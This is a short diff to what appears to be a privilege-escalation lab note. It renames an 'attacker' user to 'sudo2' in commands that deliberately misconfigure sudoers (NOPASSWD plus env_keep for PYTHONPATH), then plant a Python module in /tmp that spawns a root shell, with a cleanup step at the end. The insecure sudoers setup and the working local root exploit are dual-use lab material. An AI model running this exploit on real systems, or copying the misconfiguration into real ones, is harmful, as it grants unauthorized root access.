@@ -3,10 +3,10 @@
 ```sh
 # root
 cp /etc/sudoers /etc/sudoers.bak
-adduser attacker
-echo "attacker ALL=(ALL) NOPASSWD: /usr/bin/python /home/attacker/script.py" >> /etc/sudoers
+adduser sudo2
+echo "sudo2 ALL=(ALL) NOPASSWD: /usr/bin/python /home/sudo2/script.py" >> /etc/sudoers
 echo "Defaults env_keep += PYTHONPATH" >> /etc/sudoers
-echo 'import random; print(random.randint(1, 10))' > /home/attacker/script.py
+echo 'import random; print(random.randint(1, 10))' > /home/sudo2/script.py
 ```
 
 # Exploit
@@ -16,7 +16,7 @@ echo 'import os' > /tmp/random.py
 echo 'os.system("/bin/bash -p")' >> /tmp/random.py
 
 export PYTHONPATH=/tmp
-sudo python /home/attacker/script.py
+sudo python /home/sudo2/script.py
 ```
 
 
@@ -30,6 +30,6 @@ sudo python /home/attacker/script.py
 # Clean Up
 
 ```bash
-deluser attacker --remove-home
+deluser sudo2 --remove-home
 cp /etc/sudoers.bak /etc/sudoers
 ```
